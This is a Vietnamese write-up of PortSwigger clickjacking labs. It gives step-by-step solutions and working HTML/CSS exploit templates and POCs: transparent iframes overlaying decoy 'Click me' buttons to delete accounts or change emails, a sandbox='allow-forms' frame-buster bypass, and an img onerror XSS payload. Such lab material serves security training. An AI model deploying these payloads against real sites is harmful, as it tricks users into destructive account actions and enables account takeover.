---
layout: post
title: "Clickjacking"
render_with_liquid: false
categories:
  - PortSwigger
tags:
  - portswigger
  - clickjacking
source_collection: notion_portswigger
---
Created by: Nguyễn Giang Nam
Topics: Client-side

Lab này chứa chức năng đăng nhập và một nút xóa tài khoản được bảo vệ bởi token CSRF. Người dùng sẽ nhấp vào các phần tử hiển thị từ "click" trên một trang web mồi nhử.

Để giải quyết lab này, hãy tạo một đoạn mã HTML nhúng trang tài khoản (dưới dạng khung/iframe) và đánh lừa người dùng xóa tài khoản của họ. Lab được coi là hoàn thành khi tài khoản bị xóa.

Bạn có thể đăng nhập vào tài khoản của mình bằng thông tin sau: wiener:peter

**Lưu ý:**

Nạn nhân sẽ sử dụng trình duyệt Chrome, vì vậy hãy kiểm tra mã khai thác của bạn trên trình duyệt đó

1. Đăng nhập vào tài khoản của bạn trên trang web mục tiêu.
2. Đi đến **exploit server** (máy chủ khai thác) và dán mẫu HTML sau vào phần **Body**:
    
    ```php
    <style>
        iframe {
            position:relative;
            width:$width_value;
            height: $height_value;
            opacity: $opacity;
            z-index: 2;
        }
        div {
            position:absolute;
            top:$top_value;
            left:$side_value;
            z-index: 1;
        }
    </style>
    <div>Test me</div>
    <iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
    ```
    
3. Thực hiện các điều chỉnh sau đối với mẫu trên:
    - Thay thế YOUR-LAB-ID trong thuộc tính src của iframe bằng ID lab duy nhất của bạn.
    - Thay thế các giá trị pixel phù hợp cho các biến $height_value và $width_value của iframe (chúng tôi gợi ý lần lượt là 700px và 500px).
    - Thay thế các giá trị pixel phù hợp cho các biến $top_value và $side_value của nội dung web mồi nhử sao cho nút "Delete account" (Xóa tài khoản) và hành động mồi nhử "Test me" thẳng hàng với nhau (chúng tôi gợi ý lần lượt là 300px và 60px).
    - Thiết lập giá trị độ mờ $opacity để đảm bảo iframe mục tiêu trở nên trong suốt. Ban đầu, hãy sử dụng độ mờ là 0.1 để bạn có thể căn chỉnh các hành động của iframe và điều chỉnh vị trí nếu cần. Đối với cuộc tấn công gửi đi chính thức, giá trị 0.0001 sẽ hoạt động tốt.
4. Nhấp vào **Store** và sau đó là **View exploit**.
5. Di chuột qua chữ "Test me" và đảm bảo con trỏ chuyển sang hình bàn tay, điều này cho thấy phần tử div đã được định vị chính xác (nằm dưới nút xóa). **Đừng tự mình nhấp vào nút "Delete account".** Nếu bạn làm vậy, lab sẽ bị hỏng và bạn sẽ phải đợi cho đến khi nó reset để thử lại (khoảng 20 phút). Nếu thẻ div không thẳng hàng, hãy điều chỉnh các thuộc tính top và left trong phần style.
6. Khi bạn đã căn chỉnh phần tử div chính xác, hãy đổi chữ "Test me" thành "Click me" và nhấp **Store**.
7. Nhấp vào **Deliver exploit to victim** (Gửi mã khai thác cho nạn nhân) và lab sẽ được giải quyết.

**Lab: Clickjacking với dữ liệu biểu mẫu được điền trước từ tham số URL**

Lab này mở rộng ví dụ về clickjacking cơ bản trong bài *Lab: Clickjacking cơ bản với bảo vệ bằng token CSRF*. Mục tiêu của lab là thay đổi địa chỉ email của người dùng bằng cách điền trước (prepopulating) một biểu mẫu sử dụng tham số URL và dụ dỗ người dùng vô tình nhấp vào nút "Update email" (Cập nhật email).

Để giải quyết lab, hãy tạo một đoạn mã HTML nhúng trang tài khoản (dưới dạng khung/iframe) và đánh lừa người dùng cập nhật địa chỉ email của họ bằng cách nhấp vào mồi nhử "Click me". Lab được hoàn thành khi địa chỉ email bị thay đổi.

Bạn có thể đăng nhập vào tài khoản của mình bằng thông tin sau: wiener:peter

**Lưu ý:**

Nạn nhân sẽ sử dụng trình duyệt Chrome, vì vậy hãy kiểm tra mã khai thác của bạn trên trình duyệt đó.

**Gợi ý:**

Bạn không thể đăng ký một địa chỉ email đã được người dùng khác sử dụng. Nếu bạn thay đổi địa chỉ email của chính mình trong khi thử nghiệm mã khai thác, hãy đảm bảo bạn sử dụng một địa chỉ email khác cho mã khai thác cuối cùng mà bạn gửi cho nạn nhân.

1. Đăng nhập vào tài khoản trên trang web mục tiêu.
2. Đi đến **exploit server** (máy chủ khai thác) và dán mẫu HTML sau vào phần **Body**:codeHtml
    
    ```php
    <style>
        iframe {
            position:relative;
            width:$width_value;
            height: $height_value;
            opacity: $opacity;
            z-index: 2;
        }
        div {
            position:absolute;
            top:$top_value;
            left:$side_value;
            z-index: 1;
        }
    </style>
    <div>Test me</div>
    <iframe src="YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
    ```
    
3. Thực hiện các điều chỉnh sau đối với mẫu:
    - Thay thế YOUR-LAB-ID bằng ID lab duy nhất của bạn để URL trỏ đến trang tài khoản người dùng của trang web mục tiêu, nơi chứa biểu mẫu "Update email".
    - Thay thế các giá trị pixel phù hợp cho các biến $height_value và $width_value của iframe (chúng tôi gợi ý lần lượt là 700px và 500px).
    - Thay thế các giá trị pixel phù hợp cho các biến $top_value và $side_value của nội dung web mồi nhử sao cho nút "Update email" và hành động mồi nhử "Test me" thẳng hàng (chúng tôi gợi ý lần lượt là 400px và 80px).
    - Thiết lập giá trị độ mờ $opacity để đảm bảo iframe mục tiêu trở nên trong suốt. Ban đầu, hãy sử dụng độ mờ là 0.1 để bạn có thể căn chỉnh các hành động của iframe và điều chỉnh vị trí nếu cần. Đối với cuộc tấn công gửi đi chính thức, giá trị 0.0001 sẽ hoạt động tốt.
    - Điều chỉnh đã solve lab:
        
        ```php
        <style>
            iframe {
                position:relative;
                width:700;
                height: 500;
                opacity: 0.8;
                z-index: 2;
            }
            div {
                position:absolute;
                top:450;
                left:80;
                z-index: 1;
            }
        </style>
        <div>click me</div>
        <iframe src="https://0a2e009c0322bf7a81ad52c8002400f3.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
        ```
        
4. Nhấp vào **Store** và sau đó là **View exploit**.
5. Di chuột qua "Test me" và đảm bảo con trỏ chuyển sang hình bàn tay, điều này cho thấy phần tử div đã được định vị chính xác (nằm dưới nút cập nhật). Nếu không, hãy điều chỉnh vị trí của phần tử div bằng cách sửa đổi các thuộc tính top và left trong phần style.
6. Khi bạn đã căn chỉnh phần tử div chính xác, hãy đổi chữ "Test me" thành "Click me" và nhấp **Store**.
7. Thay đổi địa chỉ email trong mã khai thác của bạn sao cho nó không trùng với email hiện tại của bạn (để đảm bảo hành động thay đổi thực sự diễn ra).
8. Nhấp vào **Deliver exploit to victim** (Gửi mã khai thác cho nạn nhân) để giải quyết lab.

**Lab: Clickjacking với script chống frame (frame buster script)**

Lab này được bảo vệ bởi một script chống frame (frame buster) giúp ngăn chặn trang web bị nhúng vào khung (frame). Bạn có thể vượt qua cơ chế này và thực hiện một cuộc tấn công clickjacking để thay đổi địa chỉ email của người dùng không?

Để giải quyết lab, hãy tạo một đoạn mã HTML nhúng trang tài khoản và đánh lừa người dùng thay đổi địa chỉ email của họ bằng cách nhấp vào nút "Click me". Lab được hoàn thành khi địa chỉ email bị thay đổi.

Bạn có thể đăng nhập vào tài khoản của mình bằng thông tin sau: wiener:peter

**Lưu ý:**

Nạn nhân sẽ sử dụng trình duyệt Chrome, vì vậy hãy kiểm tra mã khai thác của bạn trên trình duyệt đó.

1. Đăng nhập vào tài khoản trên trang web mục tiêu.
2. Đi đến **exploit server** (máy chủ khai thác) và dán mẫu HTML sau vào phần **Body**:codeHtml
    
    ```php
    <style>
        iframe {
            position:relative;
            width:$width_value;
            height: $height_value;
            opacity: $opacity;
            z-index: 2;
        }
        div {
            position:absolute;
            top:$top_value;
            left:$side_value;
            z-index: 1;
        }
    </style>
    <div>Test me</div>
    <iframe sandbox="allow-forms"
    src="YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
    ```
    
    Nếu không có `allow-forms`
    
    ![image.png](/assets/img/portswigger/clickjacking/image.png)
    
3. Thực hiện các điều chỉnh sau đối với mẫu:
    - Thay thế YOUR-LAB-ID trong thuộc tính src của iframe bằng ID lab duy nhất của bạn để URL trỏ đến trang tài khoản người dùng của trang web mục tiêu, nơi chứa biểu mẫu "Update email".
    - Thay thế các giá trị pixel phù hợp cho các biến $height_value và $width_value của iframe (chúng tôi gợi ý lần lượt là 700px và 500px).
    - Thay thế các giá trị pixel phù hợp cho các biến $top_value và $side_value của nội dung web mồi nhử sao cho nút "Update email" và hành động mồi nhử "Test me" thẳng hàng với nhau (chúng tôi gợi ý lần lượt là 385px và 80px).
    - Thiết lập giá trị độ mờ $opacity để đảm bảo iframe mục tiêu trở nên trong suốt. Ban đầu, hãy sử dụng độ mờ là 0.1 để bạn có thể căn chỉnh các hành động của iframe và điều chỉnh vị trí nếu cần. Đối với cuộc tấn công gửi đi chính thức, giá trị 0.0001 sẽ hoạt động tốt.
    - **Lưu ý quan trọng:** Hãy chú ý việc sử dụng thuộc tính sandbox="allow-forms", thuộc tính này giúp vô hiệu hóa script chống frame.
4. Nhấp vào **Store** và sau đó là **View exploit**.
5. Di chuột qua "Test me" và đảm bảo con trỏ chuyển sang hình bàn tay, điều này cho thấy phần tử div đã được định vị chính xác (nằm dưới nút cập nhật). Nếu không, hãy điều chỉnh vị trí của phần tử div bằng cách sửa đổi các thuộc tính top và left trong phần style.
6. Khi bạn đã căn chỉnh phần tử div chính xác, hãy đổi "Test me" thành "Click me" và nhấp **Store**.
7. Thay đổi địa chỉ email trong mã khai thác của bạn sao cho nó không trùng với email của chính bạn.
8. Nhấp vào **Deliver exploit to victim** (Gửi mã khai thác cho nạn nhân) để giải quyết lab.
9. **POC**
    
    ```php
    <style>
        iframe {
            position:relative;
            width: 700;
            height: 500;
            opacity: 0.5;
            z-index: 2;
        }
        div {
            position:absolute;
            top: 450;
            left: 80;
            z-index: 1;
        }
    </style>
    <div>click me</div>
    <iframe sandbox="allow-forms" src="https://0ad600eb0340c702809017010034000a.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
    ```
    

**Lab: Khai thác lỗ hổng clickjacking để kích hoạt DOM-based XSS**

Lab này chứa một lỗ hổng XSS được kích hoạt bởi một cú nhấp chuột. Hãy xây dựng một cuộc tấn công clickjacking để đánh lừa người dùng nhấp vào nút "Click me", từ đó gọi hàm print().

1. Đi đến **exploit server** (máy chủ khai thác) và dán mẫu HTML sau vào phần **Body**:codeHtml
    
    ```php
    <style>
        iframe {
            position:relative;
            width:$width_value;
            height: $height_value;
            opacity: $opacity;
            z-index: 2;
        }
        div {
            position:absolute;
            top:$top_value;
            left:$side_value;
            z-index: 1;
        }
    </style>
    <div>Test me</div>
    <iframe
    src="YOUR-LAB-ID.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
    ```
    
2. Thực hiện các điều chỉnh sau đối với mẫu:
    - Thay thế YOUR-LAB-ID trong thuộc tính src của iframe bằng ID lab duy nhất của bạn để URL trỏ đến trang "Submit feedback" (Gửi phản hồi) của trang web mục tiêu.
    - Thay thế các giá trị pixel phù hợp cho các biến $height_value và $width_value của iframe (chúng tôi gợi ý lần lượt là 700px và 500px).
    - Thay thế các giá trị pixel phù hợp cho các biến $top_value và $side_value của nội dung web mồi nhử sao cho nút "Submit feedback" và hành động mồi nhử "Test me" thẳng hàng với nhau (chúng tôi gợi ý lần lượt là 610px và 80px).
    - Thiết lập giá trị độ mờ $opacity để đảm bảo rằng iframe mục tiêu trở nên trong suốt. Ban đầu, hãy sử dụng độ mờ là 0.1 để bạn có thể căn chỉnh các hành động của iframe và điều chỉnh giá trị vị trí nếu cần. Đối với cuộc tấn công gửi đi chính thức, giá trị 0.0001 sẽ hoạt động tốt.
3. Nhấp vào **Store** và sau đó là **View exploit**.
4. Di chuột qua "Test me" và đảm bảo con trỏ chuyển sang hình bàn tay, điều này cho thấy phần tử div đã được định vị chính xác (nằm dưới nút gửi). Nếu không, hãy điều chỉnh vị trí của phần tử div bằng cách sửa đổi các thuộc tính top và left trong phần style.
5. Nhấp vào **Test me**. Hộp thoại in (print dialog) sẽ mở ra.
6. Đổi chữ "Test me" thành "Click me" và nhấp **Store** trên máy chủ khai thác.
7. Bây giờ, hãy nhấp vào **Deliver exploit to victim** (Gửi mã khai thác cho nạn nhân) và lab sẽ được giải quyết.

**POC**

```php
<style>
    iframe {
        position:relative;
        width:700;
        height: 500;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top:420;
        left:80;
        z-index: 1;
    }
</style>
<div>click me</div>
<iframe
src="https://0ada0018046cd49fe3bd0395009a0012.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
```

**Lab: Clickjacking đa bước (Multistep clickjacking)**

Lab này có chức năng tài khoản được bảo vệ bởi token CSRF và đồng thời có một hộp thoại xác nhận để bảo vệ chống lại tấn công Clickjacking. Để giải quyết lab này, hãy xây dựng một cuộc tấn công đánh lừa người dùng nhấp vào nút xóa tài khoản và hộp thoại xác nhận bằng cách nhấp vào các hành động mồi nhử "Click me first" (Nhấp tôi trước) và "Click me next" (Nhấp tôi tiếp theo). Bạn sẽ cần sử dụng hai phần tử cho lab này.

Bạn có thể tự đăng nhập vào tài khoản bằng thông tin sau: wiener:peter

**Lưu ý:**

Nạn nhân sẽ sử dụng trình duyệt Chrome, vì vậy hãy kiểm tra mã khai thác của bạn trên trình duyệt đó.

1. Đăng nhập vào tài khoản của bạn trên trang web mục tiêu và đi đến trang tài khoản người dùng.
2. Đi đến **exploit server** (máy chủ khai thác) và dán mẫu HTML sau vào phần **Body**:codeHtml
    
    ```php
    <style>
        iframe {
            position:relative;
            width:$width_value;
            height: $height_value;
            opacity: $opacity;
            z-index: 2;
        }
       .firstClick, .secondClick {
            position:absolute;
            top:$top_value1;
            left:$side_value1;
            z-index: 1;
        }
       .secondClick {
            top:$top_value2;
            left:$side_value2;
        }
    </style>
    <div class="firstClick">Test me first</div>
    <div class="secondClick">Test me next</div>
    <iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
    ```
    
3. Thực hiện các điều chỉnh sau đối với mẫu:
    - Thay thế YOUR-LAB-ID bằng ID lab duy nhất của bạn để URL trỏ đến trang tài khoản người dùng của trang web mục tiêu.
    - Thay thế các giá trị pixel phù hợp cho các biến $width_value và $height_value của iframe (chúng tôi gợi ý lần lượt là 500px và 700px).
    - Thay thế các giá trị pixel phù hợp cho các biến $top_value1 và $side_value1 của nội dung web mồi nhử sao cho nút "Delete account" (Xóa tài khoản) và hành động mồi nhử "Test me first" thẳng hàng với nhau (chúng tôi gợi ý lần lượt là 330px và 50px).
    - Thay thế một giá trị phù hợp cho các biến $top_value2 và $side_value2 sao cho hành động mồi nhử "Test me next" thẳng hàng với nút "Yes" trên trang xác nhận (chúng tôi gợi ý lần lượt là 285px và 225px).
    - Thiết lập giá trị độ mờ $opacity để đảm bảo rằng iframe mục tiêu trở nên trong suốt. Ban đầu, hãy sử dụng độ mờ là 0.1 để bạn có thể căn chỉnh các hành động của iframe và điều chỉnh giá trị vị trí nếu cần. Đối với cuộc tấn công gửi đi chính thức, giá trị 0.0001 sẽ hoạt động tốt.
4. Nhấp vào **Store** và sau đó là **View exploit**.
5. Di chuột qua "Test me first" và đảm bảo con trỏ chuyển sang hình bàn tay, điều này cho thấy phần tử div đã được định vị chính xác (nằm trên nút xóa). Nếu không, hãy điều chỉnh vị trí của phần tử div bằng cách sửa đổi các thuộc tính top và left bên trong class firstClick của style sheet.
6. Nhấp vào "Test me first", sau đó di chuột qua "Test me next" và đảm bảo con trỏ chuyển sang hình bàn tay, điều này cho thấy phần tử div thứ hai đã được định vị chính xác (nằm trên nút Yes). Nếu không, hãy điều chỉnh vị trí của phần tử div bằng cách sửa đổi các thuộc tính top và left bên trong class secondClick của style sheet.
7. Khi bạn đã căn chỉnh các phần tử div chính xác, hãy đổi "Test me first" thành "Click me first", "Test me next" thành "Click me next" và nhấp **Store** trên máy chủ khai thác.
8. Bây giờ, hãy nhấp vào **Deliver exploit to victim** (Gửi mã khai thác cho nạn nhân) và lab sẽ được giải quyết.

**POC**

```php
<style>
    iframe {
        position:relative;
        width:700;
        height: 700;
        opacity: 0.5;
        z-index: 2;
    }
   .firstClick, .secondClick {
        position:absolute;
        top:500;
        left:80;
        z-index: 1;
    }
   .secondClick {
        top:290;
        left:220;
    }
</style>
<div class="firstClick">click me first</div>
<div class="secondClick">click me next</div>
<iframe src="https://0a3200f80461d473e3320d78002600fd.web-security-academy.net/my-account"></iframe>
```
